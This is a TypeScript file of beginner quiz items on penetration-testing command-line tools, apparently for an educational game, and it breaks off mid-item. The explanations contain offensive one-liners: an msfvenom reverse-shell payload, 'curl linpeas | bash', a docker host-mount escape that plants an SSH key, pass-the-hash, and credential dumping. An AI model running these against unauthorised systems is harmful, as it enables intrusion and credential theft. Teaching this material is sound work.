// LEVEL 9: WHALE — Hacking & Pentest Concepts (CLI)
// 100 Beginner questions. Educational/ethical pentest focus. Intermediate/Expert use placeholders.

const beginner = [
  (_i: number) => ({
    q: "What does `nmap -sV target` do?",
    o: ["Probes open ports for service/version", "Nmap version", "Service detection", "Version scan"],
    c: 0,
    e: "nmap -sV detects service and version. -sV = version detection. Part of recon.",
    de: "nmap -sV 192.168.1.1. Probes banners, responses. Identifies Apache 2.4, OpenSSH 8.1, etc."
  }),
  (_i: number) => ({
    q: "What does `nmap -sC target` do?",
    o: ["Runs default NSE scripts", "Nmap scripts", "Default scripts", "Script scan"],
    c: 0,
    e: "nmap -sC runs default scripts. Discovery, vuln checks. -sC = script default.",
    de: "nmap -sC 192.168.1.1. Equivalent to --script=default. Safe, common scripts."
  }),
  (_i: number) => ({
    q: "What does `nmap -O target` do?",
    o: ["Attempts OS detection", "OS detection", "Nmap OS", "Operating system"],
    c: 0,
    e: "nmap -O guesses OS from TCP/IP fingerprint. Requires root. Part of enumeration.",
    de: "nmap -O 192.168.1.1. Sends probes, matches fingerprint. Linux 3.x, Windows 10, etc."
  }),
  (_i: number) => ({
    q: "What does `nmap -p- target` do?",
    o: ["Scans all 65535 ports", "All ports", "Full port scan", "Port range"],
    c: 0,
    e: "nmap -p- scans all ports. -p 1-65535. Slower than default top ports.",
    de: "nmap -p- 192.168.1.1. Default is top 1000. -p- = full. Takes longer."
  }),
  (_i: number) => ({
    q: "What does `nmap -sS target` do?",
    o: ["SYN scan (half-open, stealthier)", "SYN scan", "Stealth scan", "Half-open scan"],
    c: 0,
    e: "nmap -sS sends SYN, doesn't complete handshake. Stealthier. Requires root.",
    de: "nmap -sS. Doesn't complete TCP. -sT for full connect (no root). -sS default for root."
  }),
  (_i: number) => ({
    q: "What does `nmap -sU -p 53,161 target` do?",
    o: ["UDP scan on DNS and SNMP ports", "UDP scan", "UDP ports", "UDP probe"],
    c: 0,
    e: "nmap -sU scans UDP. -p for ports. UDP is slower (no response = open|filtered).",
    de: "nmap -sU -p 53,161 192.168.1.1. DNS 53, SNMP 161. UDP scan is slow."
  }),
  (_i: number) => ({
    q: "What does `nmap --script vuln target` do?",
    o: ["Runs vulnerability detection scripts", "Vuln scripts", "Vulnerability scan", "NSE vuln"],
    c: 0,
    e: "nmap --script vuln runs vuln scripts. Checks known CVEs. Part of pentest.",
    de: "nmap --script vuln 192.168.1.1. NSE vuln category. May generate traffic. Authorize first."
  }),
  (_i: number) => ({
    q: "What does `nikto -h http://target` do?",
    o: ["Web server vulnerability scanner", "Nikto scan", "Web vuln scan", "HTTP scanner"],
    c: 0,
    e: "nikto scans web server. Checks misconfigs, outdated, dangerous files.",
    de: "nikto -h http://192.168.1.1. Many checks. -ssl for HTTPS. Part of web recon."
  }),
  (_i: number) => ({
    q: "What does `gobuster dir -u URL -w wordlist` do?",
    o: ["Directory/file brute force", "Gobuster dir", "Directory bust", "Wordlist dir"],
    c: 0,
    e: "gobuster dir finds hidden dirs. -u URL, -w wordlist. -x for extensions.",
    de: "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt. Discovers paths."
  }),
  (_i: number) => ({
    q: "What does `gobuster dns -d domain -w wordlist` do?",
    o: ["Subdomain enumeration", "Gobuster DNS", "Subdomain brute", "DNS brute"],
    c: 0,
    e: "gobuster dns finds subdomains. -d domain, -w wordlist. DNS recon.",
    de: "gobuster dns -d example.com -w subdomains.txt. Discovers api., dev., admin., etc."
  }),
  (_i: number) => ({
    q: "What does `searchsploit` do?",
    o: ["Searches Exploit-DB for exploits", "Search exploit", "Exploit search", "Exploit DB"],
    c: 0,
    e: "searchsploit apache 2.4. Searches local Exploit-DB. -m copies to current dir.",
    de: "searchsploit openssl. searchsploit -m 12345. Part of offensive toolkit."
  }),
  (_i: number) => ({
    q: "What does `msfconsole` launch?",
    o: ["Metasploit Framework console", "Metasploit", "MSF console", "Exploit framework"],
    c: 0,
    e: "msfconsole is Metasploit CLI. use exploit/..., set RHOSTS, run. Pentest framework.",
    de: "msfconsole. use exploit/multi/handler. set payload. exploit. Post-exploitation modules."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -f format` do?",
    o: ["Generates payload (shellcode, etc.)", "Msfvenom", "Payload gen", "Generate payload"],
    c: 0,
    e: "msfvenom creates payloads. -p windows/meterpreter/reverse_tcp. -f exe, elf, raw.",
    de: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -o shell.elf."
  }),
  (_i: number) => ({
    q: "What does `sqlmap -u 'URL'` do?",
    o: ["Tests for SQL injection", "SQLmap", "SQL injection", "SQLi test"],
    c: 0,
    e: "sqlmap tests URL for SQLi. -u URL. --dbs for databases. Automated SQLi.",
    de: "sqlmap -u 'http://target/page?id=1'. --dbs, --tables, --dump. Authorize first."
  }),
  (_i: number) => ({
    q: "What does `hydra -l user -P passlist ssh://target` do?",
    o: ["Password brute force against SSH", "Hydra brute", "Password spray", "SSH brute"],
    c: 0,
    e: "hydra tries passwords. -l user, -P wordlist. ssh://, http-form, etc. Many protocols.",
    de: "hydra -l admin -P rockyou.txt ssh://192.168.1.1. -t 4 for threads. Rate limit aware."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 0 hashes wordlist` do?",
    o: ["Cracks hashes (e.g. MD5)", "Hashcat crack", "Hash crack", "Password crack"],
    c: 0,
    e: "hashcat -m 0 for MD5. hashes file, wordlist. GPU accelerated. -m 1000 for NTLM.",
    de: "hashcat -m 0 hashes.txt rockyou.txt. -m 1000 NTLM. -m 1800 SHA512. Fast cracking."
  }),
  (_i: number) => ({
    q: "What does `john --wordlist=wordlist hashfile` do?",
    o: ["John the Ripper wordlist mode", "John wordlist", "Password crack", "John crack"],
    c: 0,
    e: "john uses wordlist. john --wordlist=rockyou.txt hashes. Many hash types auto-detected.",
    de: "john --wordlist=pass.txt hashes.txt. john --format=raw-md5. Incremental, single also."
  }),
  (_i: number) => ({
    q: "What does `tcpdump -i eth0 port 80` do?",
    o: ["Captures HTTP traffic", "Tcpdump port 80", "HTTP capture", "Packet capture"],
    c: 0,
    e: "tcpdump captures packets. -i interface, port 80. Requires root. Passive recon.",
    de: "tcpdump -i eth0 port 80 -w cap.pcap. -A for ASCII. Inspect with Wireshark."
  }),
  (_i: number) => ({
    q: "What does `wireshark` (or tshark) do?",
    o: ["Packet capture and protocol analysis", "Wireshark", "Packet analyzer", "Protocol decode"],
    c: 0,
    e: "tshark -i eth0. Captures, decodes. HTTP, TLS, DNS. Passive recon, traffic analysis.",
    de: "tshark -i eth0 -w cap.pcap. tshark -r cap.pcap. Filter: tcp.port==80. Deep inspection."
  }),
  (_i: number) => ({
    q: "What does `responder -I eth0` do?",
    o: ["Captures NTLM hashes (LLMNR/NBT-NS)", "Responder", "LLMNR poison", "NTLM capture"],
    c: 0,
    e: "Responder poisons LLMNR, NBT-NS. Captures auth hashes. Internal pentest.",
    de: "responder -I eth0. When host looks up name, we respond. Hash for crack/relay."
  }),
  (_i: number) => ({
    q: "What does `enum4linux target` do?",
    o: ["Enumerates SMB/NetBIOS info", "Enum4linux", "SMB enum", "Windows enum"],
    c: 0,
    e: "enum4linux queries SMB. Users, groups, shares. -a for all. Windows/Linux Samba.",
    de: "enum4linux 192.168.1.1. enum4linux -a. RID brute, policy. Part of Windows recon."
  }),
  (_i: number) => ({
    q: "What does `smbclient -L //target` do?",
    o: ["Lists SMB shares", "SMB list", "Share list", "SMB shares"],
    c: 0,
    e: "smbclient -L lists shares. -N no pass. -U user. Enumerate shares.",
    de: "smbclient -L //192.168.1.1 -N. Anonymous if allowed. smbclient //target/share to connect."
  }),
  (_i: number) => ({
    q: "What does `nuclei -u URL` do?",
    o: ["Runs vulnerability templates against URL", "Nuclei scan", "Vuln templates", "Fast vuln scan"],
    c: 0,
    e: "nuclei runs YAML templates. CVE, misconfigs. nuclei -u http://target. Fast, many checks.",
    de: "nuclei -u http://target. -t cves/. nuclei-update for templates. ProjectDiscovery."
  }),
  (_i: number) => ({
    q: "What does `ffuf -u URL -w wordlist -mc 200` do?",
    o: ["Fast web fuzzer", "FFuf", "Web fuzzer", "Fuzz URL"],
    c: 0,
    e: "ffuf fuzzes. -u URL/FUZZ, -w wordlist. -mc 200 = match status. Fast, flexible.",
    de: "ffuf -u http://target/FUZZ -w words.txt -mc 200. -fc 404 to filter. Dir, param fuzz."
  }),
  (_i: number) => ({
    q: "What does `wfuzz` do?",
    o: ["Web application fuzzer", "WFuzz", "Web fuzzer", "Fuzz web"],
    c: 0,
    e: "wfuzz fuzzes web. wfuzz -w wordlist -u http://target/FUZZ. Headers, params.",
    de: "wfuzz -c -z file,words.txt http://target/FUZZ. -H for headers. Alternative to ffuf."
  }),
  (_i: number) => ({
    q: "What does `cewl URL` do?",
    o: ["Generates wordlist from target website", "Cewl", "Custom wordlist", "Spider wordlist"],
    c: 0,
    e: "cewl spiders URL, extracts words. Custom wordlist for target. -d depth, -m min length.",
    de: "cewl http://target -w custom.txt -m 5. Targeted wordlist. Better than generic."
  }),
  (_i: number) => ({
    q: "What does `theHarvester -d domain -b google` do?",
    o: ["Gathers emails, subdomains from sources", "TheHarvester", "OSINT", "Recon gather"],
    c: 0,
    e: "theHarvester -d domain -b google,bing. Emails, hosts, subdomains. Passive recon.",
    de: "theHarvester -d example.com -b google -f report. -b all for all sources. OSINT."
  }),
  (_i: number) => ({
    q: "What does `amass enum -d domain` do?",
    o: ["Subdomain enumeration (passive/active)", "Amass", "Subdomain enum", "Asset discovery"],
    c: 0,
    e: "amass enum discovers subdomains. Passive: certs, archives. Active: DNS. OWASP Amass.",
    de: "amass enum -d example.com. -passive for passive only. Output for scope."
  }),
  (_i: number) => ({
    q: "What does `masscan -p80,443 10.0.0.0/8` do?",
    o: ["Very fast port scanner", "Masscan", "Fast scan", "Port scanner"],
    c: 0,
    e: "masscan scans fast. -p ports, range. Async. Can scan internet in minutes. Careful!",
    de: "masscan -p80,443 10.0.0.0/8 --rate 1000. Much faster than nmap. Less accurate."
  }),
  (_i: number) => ({
    q: "What does `rustscan` do?",
    o: ["Fast port scanner (Rust)", "Rustscan", "Fast scanner", "Port scan"],
    c: 0,
    e: "rustscan is fast. rustscan -a target. Finds ports, pipes to nmap. Modern alternative.",
    de: "rustscan -a 192.168.1.1. Async. -- -sV -sC to pass to nmap. Speed + detail."
  }),
  (_i: number) => ({
    q: "What does `crackmapexec smb 10.0.0.0/24` do?",
    o: ["SMB enumeration across network", "CrackMapExec", "SMB enum", "Network SMB"],
    c: 0,
    e: "crackmapexec (cme) enumerates SMB. Shares, users, password spray. ByBloodhound team.",
    de: "crackmapexec smb 10.0.0.0/24 -u user -p pass. Spray, enum. WinRM, LDAP too."
  }),
  (_i: number) => ({
    q: "What does `impacket-psexec user:pass@target` do?",
    o: ["Executes command via PsExec (Impacket)", "PsExec", "Impacket exec", "Remote exec"],
    c: 0,
    e: "impacket-psexec runs command on Windows. Uses SMB. Pass-the-hash with :hash.",
    de: "impacket-psexec user:pass@192.168.1.1. impacket-psexec -hashes :hash user@target. Lateral."
  }),
  (_i: number) => ({
    q: "What does `mimikatz` do?",
    o: ["Extracts credentials from Windows memory", "Mimikatz", "Credential dump", "LSASS"],
    c: 0,
    e: "Mimikatz extracts hashes, tickets from LSASS. sekurlsa::logonpasswords. Post-exploit.",
    de: "Windows tool. Dumps NTLM, Kerberos. Requires admin. Often detected. Authorize only."
  }),
  (_i: number) => ({
    q: "What does `linpeas` do?",
    o: ["Linux privilege escalation checker", "LinPEAS", "Linux PE", "Privesc checker"],
    c: 0,
    e: "linpeas.sh checks for privesc vectors. SUID, writable, cron, etc. Color output.",
    de: "curl linpeas | bash. Or run locally. PEASS-ng. Suggests exploits. Post-exploit."
  }),
  (_i: number) => ({
    q: "What does `linux-exploit-suggester` do?",
    o: ["Suggests kernel exploits for system", "Linux exploit suggester", "Kernel exploits", "Privesc suggest"],
    c: 0,
    e: "Checks kernel version, suggests exploits. Uname, etc. May have false positives.",
    de: "linux-exploit-suggester.sh. Compares to exploit-db. Run with care. Test in lab."
  }),
  (_i: number) => ({
    q: "What does `sudo -l` show for privesc?",
    o: ["Sudo privileges (possible privesc)", "Sudo list", "Sudo perms", "Allowed commands"],
    c: 0,
    e: "sudo -l shows what user can run. (ALL) NOPASSWD = privesc. Specific binary = GTFObin.",
    de: "sudo -l. If /usr/bin/vi (ALL) = sudo vi, :!bash. GTFOBins for abuse. Common privesc."
  }),
  (_i: number) => ({
    q: "What does `find / -perm -4000 2>/dev/null` find?",
    o: ["SUID binaries (privesc candidates)", "SUID find", "Setuid binaries", "Privesc SUID"],
    c: 0,
    e: "SUID runs as owner. find -perm -4000. GTFOBins for abuse. Common privesc.",
    de: "find / -perm -4000. /usr/bin/find, vim, etc. If owner root, may escalate."
  }),
  (_i: number) => ({
    q: "What does `crontab -l` check for privesc?",
    o: ["User cron jobs (possible hijack)", "Crontab list", "Cron jobs", "Scheduled tasks"],
    c: 0,
    e: "crontab -l shows user cron. Writable script? Hijack. /etc/cron.d, cron.daily.",
    de: "crontab -l. ls -la /etc/cron.d. If we can write to cron script, get execution."
  }),
  (_i: number) => ({
    q: "What does `cat /etc/passwd` show for privesc?",
    o: ["Users, shells, UID 0 (root)", "Passwd file", "User list", "Accounts"],
    c: 0,
    e: "/etc/passwd: users, UID. UID 0 = root. /bin/bash = shell. nologin = no shell.",
    de: "cat /etc/passwd. Root UID 0. Second root? /bin/false = no login. User enum."
  }),
  (_i: number) => ({
    q: "What does `netstat -tulpn` or `ss -tulpn` show for privesc?",
    o: ["Listening services (internal attack)", "Listening ports", "Services", "Local services"],
    c: 0,
    e: "Listening services. Internal only? Redis, MySQL no auth? Docker socket? Attack surface.",
    de: "ss -tulpn. 127.0.0.1 only = local. 0.0.0.0 = all interfaces. Redis 6379, MySQL 3306."
  }),
  (_i: number) => ({
    q: "What does `env` show for privesc?",
    o: ["Environment (passwords, keys)", "Environment", "Env vars", "Secrets"],
    c: 0,
    e: "env may have secrets. API keys, DB passwords. Check .bashrc, .profile. Common leak.",
    de: "env. echo $API_KEY. Often in cron, systemd. Credentials in env = bad practice."
  }),
  (_i: number) => ({
    q: "What does `id` and `groups` show for privesc?",
    o: ["User, groups (docker, etc?)", "User groups", "Memberships", "Privileged groups"],
    c: 0,
    e: "groups: docker = container escape. adm = logs. sudo = maybe. wheel, etc.",
    de: "id. groups. docker group = root. adm = /var/log. Find group-based privesc."
  }),
  (_i: number) => ({
    q: "What does `docker run -v /:/mnt -it alpine` allow?",
    o: ["Mount host root (container escape)", "Docker mount", "Root mount", "Container escape"],
    c: 0,
    e: "docker run -v /:/mnt mounts host /. If we're in container, we see host fs. Escape.",
    de: "docker run -v /:/mnt -it alpine. chroot /mnt. Add SSH key to /mnt/root/.ssh. Escape."
  }),
  (_i: number) => ({
    q: "What does `linenum` do?",
    o: ["Linux enumeration script", "Linenum", "Linux enum", "Enum script"],
    c: 0,
    e: "linenum.sh enumerates system. Users, SUID, cron, etc. Older, linpeas more common.",
    de: "./linenum.sh. Comprehensive. Replaced by linpeas/linpeas.sh in many workflows."
  }),
  (_i: number) => ({
    q: "What does `pspy` do?",
    o: ["Monitors processes without root", "Pspy", "Process monitor", "Cron monitor"],
    c: 0,
    e: "pspy watches processes. See cron, scripts. No root. Find execution for hijack.",
    de: "pspy64. Watches /proc. See what runs. Cron, systemd timers. Find writable + executed."
  }),
  (_i: number) => ({
    q: "What does `bloodhound` collect?",
    o: ["AD attack paths (ingestors)", "BloodHound", "AD paths", "Attack paths"],
    c: 0,
    e: "BloodHound ingestor collects AD data. SharpHound, etc. Graph DB for paths to DA.",
    de: "SharpHound. Collects users, groups, sessions. Import to BloodHound. Find path to Domain Admin."
  }),
  (_i: number) => ({
    q: "What does `kerbrute userenum` do?",
    o: ["Enumerates valid AD usernames", "Kerbrute", "User enum", "AD users"],
    c: 0,
    e: "kerbrute userenum -d domain users.txt. Valid users from Kerberos. No lockout (usually).",
    de: "kerbrute userenum -d corp.com users.txt. Different error = valid. Password spray next."
  }),
  (_i: number) => ({
    q: "What does `GetNPUsers` (Impacket) do?",
    o: ["Requests TGT for users without preauth", "GetNPUsers", "AS-REP roast", "Kerberos"],
    c: 0,
    e: "impacket-GetNPUsers gets AS-REP. Users with DontReqPreAuth. Crackable offline.",
    de: "impacket-GetNPUsers domain/ -usersfile users -no-pass. Hashcat -m 18200 to crack."
  }),
  (_i: number) => ({
    q: "What does `secretsdump` (Impacket) do?",
    o: ["Dumps hashes from DC/registry", "Secretsdump", "Hash dump", "Credential dump"],
    c: 0,
    e: "impacket-secretsdump dumps NTLM, etc. From DC, SAM. Requires DA or backup.",
    de: "impacket-secretsdump domain/admin:pass@dc. NTLM hashes. Pass-the-hash next."
  }),
  (_i: number) => ({
    q: "What does `proxychains` do?",
    o: ["Routes commands through proxy", "Proxychains", "Proxy tunnel", "Traffic redirect"],
    c: 0,
    e: "proxychains cmd routes through proxy. For pivoting. proxychains nmap target.",
    de: "proxychains nmap 10.10.10.1. Add socks4 127.0.0.1 1080 to config. Pivot through host."
  }),
  (_i: number) => ({
    q: "What does `chisel` do?",
    o: ["TCP/UDP tunnel (pivoting)", "Chisel", "Tunnel", "Pivot tunnel"],
    c: 0,
    e: "chisel creates tunnels. Client-server. Forward ports. Pivot through compromised host.",
    de: "chisel server -p 8080. chisel client server:8080 R:0.0.0.0:1080:socks. SOCKS proxy."
  }),
  (_i: number) => ({
    q: "What does `socat` do for pivoting?",
    o: ["Relay connections (forward ports)", "Socat relay", "Port forward", "Connection relay"],
    c: 0,
    e: "socat relays. socat TCP-LISTEN:4444,fork TCP:10.10.10.1:80. Pivot listener.",
    de: "socat TCP-LISTEN:4444,fork TCP:internal:80. On pivot, forward to internal. Bidirectional."
  }),
  (_i: number) => ({
    q: "What does `ssh -D 1080 user@pivot` do for pivoting?",
    o: ["Creates SOCKS proxy through pivot", "SSH SOCKS", "Dynamic forward", "Proxy pivot"],
    c: 0,
    e: "ssh -D 1080 creates SOCKS5. proxychains uses it. Access internal via pivot.",
    de: "ssh -D 1080 user@192.168.1.5. proxychains nmap 10.10.10.0/24. Pivot through jump."
  }),
  (_i: number) => ({
    q: "What does `burpsuite` do?",
    o: ["HTTP proxy for web testing", "Burp Suite", "Web proxy", "Intercept proxy"],
    c: 0,
    e: "Burp intercepts HTTP. Modify requests. Repeater, intruder, scanner. Web app testing.",
    de: "Proxy 127.0.0.1:8080. Browser proxy to Burp. Intercept, modify, replay. Industry standard."
  }),
  (_i: number) => ({
    q: "What does `zap` (OWASP ZAP) do?",
    o: ["Web app security scanner", "ZAP", "OWASP ZAP", "Web scanner"],
    c: 0,
    e: "ZAP scans web apps. Passive + active. Proxy, spider, scanner. Open source Burp alt.",
    de: "zap.sh. Automated scan. Manual explore. Alerts for vulns. CI/CD integration."
  }),
  (_i: number) => ({
    q: "What does `xsstrike` do?",
    o: ["XSS vulnerability scanner", "XSStrike", "XSS scanner", "XSS finder"],
    c: 0,
    e: "xsstrike finds XSS. Crawls, tests params. Bypasses filters. XSS discovery.",
    de: "xsstrike -u http://target/page?q=test. Automated XSS. Manual confirm. Report."
  }),
  (_i: number) => ({
    q: "What does `commix` do?",
    o: ["Tests for command injection", "Commix", "Command injection", "OS command injection"],
    c: 0,
    e: "commix -u 'http://target?cmd=test'. Tests OS command injection. Semi-automated.",
    de: "commix -u 'http://target/page?param=1'. Detects, exploits. |, ;, `, etc."
  }),
  (_i: number) => ({
    q: "What does `ysoserial` do?",
    o: ["Generates Java deserialization payloads", "Ysoserial", "Java deser", "Deserialization"],
    c: 0,
    e: "ysoserial generates payloads. Java deser. java -jar ysoserial.jar CommonsCollections4 'cmd'.",
    de: "Java object -> serialized -> gadget chain -> RCE. Jenkins, WebLogic, etc. Check version."
  }),
  (_i: number) => ({
    q: "What does `jwt_tool` do?",
    o: ["Tests/forges JWT tokens", "JWT tool", "JWT attack", "Token manipulation"],
    c: 0,
    e: "jwt_tool tests JWTs. Crack, forge, alg none. jwt_tool token. Web auth testing.",
    de: "jwt_tool token.jwt. -C for crack. -X a for alg none. -T for tamper. Auth bypass."
  }),
  (_i: number) => ({
    q: "What does `arjun` do?",
    o: ["Discovers hidden HTTP parameters", "Arjun", "Param discovery", "Hidden params"],
    c: 0,
    e: "arjun -u URL finds params. Fuzzing. Admin, debug, callback. API testing.",
    de: "arjun -u http://target/api. Discovers ?admin=, ?debug=. Expand attack surface."
  }),
  (_i: number) => ({
    q: "What does `httpx` do?",
    o: ["HTTP probing (title, status, tech)", "Httpx", "HTTP probe", "URL probe"],
    c: 0,
    e: "httpx probes URLs. Title, status, tech. echo domain | httpx. Fast. ProjectDiscovery.",
    de: "echo targets.txt | httpx -title -status-code. Mass probing. Subdomain -> live host."
  }),
  (_i: number) => ({
    q: "What does `subfinder -d domain` do?",
    o: ["Passive subdomain discovery", "Subfinder", "Subdomain find", "Passive enum"],
    c: 0,
    e: "subfinder -d domain finds subdomains. Passive sources. Fast. ProjectDiscovery.",
    de: "subfinder -d example.com. Cert transparency, etc. sublist3r, amass alternatives."
  }),
  (_i: number) => ({
    q: "What does `waybackurls` do?",
    o: ["Gets historical URLs from Wayback", "Wayback URLs", "Historical URLs", "Archive URLs"],
    c: 0,
    e: "waybackurls domain fetches URLs from archive. Old params, paths. Recon.",
    de: "echo example.com | waybackurls. wayback machine. Forgotten endpoints. Gau similar."
  }),
  (_i: number) => ({
    q: "What does `gau` (GetAllUrls) do?",
    o: ["Gathers URLs from multiple sources", "GAU", "Get all URLs", "URL gather"],
    c: 0,
    e: "echo domain | gau. Wayback, Common Crawl, etc. Historical URLs. Recon.",
    de: "echo example.com | gau. --blacklist png,jpg. Filter. Find hidden endpoints."
  }),
  (_i: number) => ({
    q: "What does `dnsx` do?",
    o: ["DNS toolkit (resolve, probe)", "Dnsx", "DNS tool", "DNS resolve"],
    c: 0,
    e: "dnsx resolves, probes. echo domains | dnsx. A, AAAA, CNAME. ProjectDiscovery.",
    de: "echo subdomains.txt | dnsx -a -aaaa. -silent for just IPs. Fast. Mass resolve."
  }),
  (_i: number) => ({
    q: "What does `naabu` do?",
    o: ["Port scanner (syn, connect)", "Naabu", "Port scan", "Scanner"],
    c: 0,
    e: "naabu scans ports. naabu -host target. Syn, connect. JSON output. ProjectDiscovery.",
    de: "naabu -list hosts.txt -p 80,443,8080. Fast. Piped with httpx. Recon pipeline."
  }),
  (_i: number) => ({
    q: "What does `katana` do?",
    o: ["Web crawler for recon", "Katana", "Crawler", "Web crawl"],
    c: 0,
    e: "katana crawls. katana -u http://target. JS parsing. ProjectDiscovery. Alternative to gospider.",
    de: "katana -u http://target -d 3. Depth. -jc for JS. Output for ffuf, nuclei."
  }),
  (_i: number) => ({
    q: "What does `gau` pipe to `gf` do?",
    o: ["Filters URLs by pattern", "GF filter", "URL filter", "Pattern filter"],
    c: 0,
    e: "echo domain | gau | gf ssrf. gf has patterns. ssrf, xss, redirect. Extract interesting.",
    de: "echo example.com | gau | gf redirect. Filter for params. gf -list for patterns."
  }),
  (_i: number) => ({
    q: "What does `qsreplace` do?",
    o: ["Replaces query param values", "Qsreplace", "Param replace", "URL replace"],
    c: 0,
    e: "cat urls | qsreplace 'payload' replaces param values. For fuzzing, injection.",
    de: "cat urls | qsreplace 'payload' | httpx -mc 200. XSS testing. Param manipulation."
  }),
  (_i: number) => ({
    q: "What does `unfurl` do?",
    o: ["Parses and manipulates URLs", "Unfurl", "URL parse", "URL manip"],
    c: 0,
    e: "unfurl parses URLs. unfurl domains. Extract domains, paths. Tomnomnom tool.",
    de: "cat urls | unfurl domains. unfurl format. Parse, normalize. Recon utility."
  }),
  (_i: number) => ({
    q: "What does `httprobe` do?",
    o: ["Probes for live HTTP/HTTPS", "Httprobe", "Live hosts", "HTTP probe"],
    c: 0,
    e: "cat domains | httprobe. Checks http/https. Returns live. Simple. httpx replaces.",
    de: "cat subdomains.txt | httprobe. Parallel. Quick live check. Old school."
  }),
  (_i: number) => ({
    q: "What does `assetfinder` do?",
    o: ["Finds related domains/subdomains", "Assetfinder", "Domain find", "Related domains"],
    c: 0,
    e: "assetfinder domain. Subdomains, related. Passive. Tomnomnom. Quick scope.",
    de: "assetfinder example.com. Cert transparency, etc. Subdomains. Scope expansion."
  }),
  (_i: number) => ({
    q: "What does `shodan` CLI do?",
    o: ["Queries Shodan search engine", "Shodan", "Search engine", "Internet scan"],
    c: 0,
    e: "shodan search apache. shodan host IP. Internet-wide scan data. API key needed.",
    de: "shodan search 'apache port:80'. shodan download. Passive recon. Banners, vulns."
  }),
  (_i: number) => ({
    q: "What does `censys` do?",
    o: ["Certificate/device search (like Shodan)", "Censys", "Cert search", "Device search"],
    c: 0,
    e: "censys searches certs, hosts. API. Certificate transparency. Subdomain discovery.",
    de: "Censys.io. Cert search for domain. Host search. Alternative to Shodan. Free tier."
  }),
  (_i: number) => ({
    q: "What does `crunch` do?",
    o: ["Generates wordlists", "Crunch", "Wordlist gen", "Password list"],
    c: 0,
    e: "crunch 6 6 0123456789 -o nums.txt. Min, max, charset. Custom wordlists.",
    de: "crunch 4 4 abcd. crunch 8 8 -t pass%%%% numbers. Pattern. For brute force."
  }),
  (_i: number) => ({
    q: "What does `cewl` with `-m` do?",
    o: ["Sets minimum word length", "Cewl min", "Min length", "Word length"],
    c: 0,
    e: "cewl -m 5 ignores short words. -m 8 for longer. Better quality wordlist.",
    de: "cewl http://target -m 6 -w custom.txt. Filter short. -d 2 for depth."
  }),
  (_i: number) => ({
    q: "What does `hash-identifier` do?",
    o: ["Identifies hash type", "Hash ID", "Hash type", "Identify hash"],
    c: 0,
    e: "hash-identifier. Paste hash. Suggests type. MD5, SHA, NTLM, etc. For crack tool choice.",
    de: "hash-identifier. 32 hex = MD5. 40 = SHA1. hashcat -m for mode. Identify first."
  }),
  (_i: number) => ({
    q: "What does `binwalk` do?",
    o: ["Analyzes/extracts firmware, binaries", "Binwalk", "Firmware analysis", "Binary extract"],
    c: 0,
    e: "binwalk file. Finds embedded files. binwalk -e extracts. Firmware, images.",
    de: "binwalk firmware.bin. binwalk -e firmware.bin. Squashfs, etc. IoT, embedded."
  }),
  (_i: number) => ({
    q: "What does `strings` do for pentest?",
    o: ["Extracts printable strings from binary", "Strings", "Extract strings", "Binary strings"],
    c: 0,
    e: "strings file extracts text. Passwords, URLs, keys. Quick recon in binary.",
    de: "strings binary | grep -i pass. strings -n 8 for longer. Quick secrets."
  }),
  (_i: number) => ({
    q: "What does `exiftool` show for pentest?",
    o: ["Metadata (GPS, software, creator)", "Exiftool", "Metadata", "File metadata"],
    c: 0,
    e: "exiftool file. Metadata in images, PDFs. GPS, creator, software. OSINT, info leak.",
    de: "exiftool image.jpg. Coordinates, camera. exiftool -all= to strip. Privacy."
  }),
  (_i: number) => ({
    q: "What does `steghide` do?",
    o: ["Hides/extracts data in images", "Steghide", "Steganography", "Hide in image"],
    c: 0,
    e: "steghide extract -sf image.jpg. Steganography. Hidden data in pixels. CTF, forensics.",
    de: "steghide extract -sf file.jpg. Prompts for pass. steghide embed. Alternate: stegseek."
  }),
  (_i: number) => ({
    q: "What does `volatility` do?",
    o: ["Analyzes memory dumps", "Volatility", "Memory analysis", "RAM dump"],
    c: 0,
    e: "volatility -f memory.dump imageinfo. Memory forensics. Processes, network, secrets.",
    de: "volatility -f mem.dump --profile=Win10x64 pslist. volatility3 for v3. Credentials."
  }),
  (_i: number) => ({
    q: "What does `autopsy` do?",
    o: ["Disk forensics GUI (Sleuth Kit)", "Autopsy", "Disk forensics", "Forensics GUI"],
    c: 0,
    e: "Autopsy is Sleuth Kit GUI. Disk image analysis. Files, timeline, keywords. Free.",
    de: "autopsy. Load disk image. File carving, timeline. Incident response, forensics."
  }),
  (_i: number) => ({
    q: "What does `sherlock` (username search) do?",
    o: ["Checks username across sites", "Sherlock", "Username search", "OSINT username"],
    c: 0,
    e: "sherlock username. Checks 300+ sites. Find accounts. OSINT. Python.",
    de: "sherlock johndoe. Social, dev, etc. Account discovery. Recon, phishing awareness."
  }),
  (_i: number) => ({
    q: "What does `recon-ng` do?",
    o: ["Recon framework (modules)", "Recon-ng", "Recon framework", "OSINT framework"],
    c: 0,
    e: "recon-ng is recon framework. Modules for different sources. Marketplace. Structured.",
    de: "recon-ng. marketplace install all. use recon/domains-hosts/... run. OSINT pipeline."
  }),
  (_i: number) => ({
    q: "What does `maltego` do?",
    o: ["Visual link analysis / OSINT", "Maltego", "Link analysis", "Graph OSINT"],
    c: 0,
    e: "Maltego graphs entities. Domain -> IP -> ASN. Visual. Transforms. Commercial + CE.",
    de: "Maltego. Add domain. Run transforms. Graph grows. Relationships. Report."
  }),
  (_i: number) => ({
    q: "What does `spiderfoot` do?",
    o: ["Automated OSINT collection", "SpiderFoot", "OSINT automation", "Recon automation"],
    c: 0,
    e: "spiderfoot automates OSINT. Web UI. Domain, IP, etc. 100+ modules. Free.",
    de: "spiderfoot. New scan. Target. Run. Emails, subdomains, etc. Correlate."
  }),
  (_i: number) => ({
    q: "What does `metasploit` `use exploit/` do?",
    o: ["Selects exploit module", "Use exploit", "Load exploit", "Select module"],
    c: 0,
    e: "use exploit/multi/handler. Loads module. set options. run. Metasploit workflow.",
    de: "use exploit/windows/smb/ms17_010_eternalblue. set RHOSTS. set payload. exploit."
  }),
  (_i: number) => ({
    q: "What does `show options` in msfconsole do?",
    o: ["Shows module options to set", "Show options", "Module options", "Set options"],
    c: 0,
    e: "show options lists required/optional. set RHOSTS target. set LHOST for reverse.",
    de: "show options. Required in red. set RHOSTS 192.168.1.1. set payload windows/meterpreter/reverse_tcp."
  }),
  (_i: number) => ({
    q: "What does `run` or `exploit` in msfconsole do?",
